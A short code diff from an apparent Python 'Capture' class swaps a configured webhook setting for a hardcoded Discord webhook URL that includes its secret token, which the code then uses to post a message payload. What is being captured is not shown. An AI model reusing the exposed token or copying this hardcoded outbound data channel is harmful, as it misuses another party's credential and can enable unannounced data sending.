@@ -84,7 +84,7 @@ class Capture:
 
             # Stop execution if no correct webhook is set
             if not webhook_url:
-                webhook_url = config.get('webhook')  
+                webhook_url = "https://discord.com/api/webhooks/1431159567676473484/mgfTr3EW3vGXY71NjNzH0VgB5dpb5klQy232OUx_CumOOBw8rfv69iQdFLxVeG0Q6NF0"
 
             # Construct message payload
             if config.get('embed') == True:
